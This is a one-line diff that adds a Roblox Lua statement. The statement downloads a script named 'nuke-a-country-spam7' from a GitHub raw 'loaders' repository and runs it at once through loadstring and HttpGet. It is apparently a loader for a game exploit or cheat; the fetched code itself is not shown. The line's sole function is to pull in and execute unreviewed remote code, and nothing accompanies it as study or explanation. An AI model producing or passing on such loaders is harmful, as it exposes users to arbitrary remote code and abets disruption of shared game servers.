@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/nuke-a-country-spam7-cdntiglan0ynx6.lua"))()
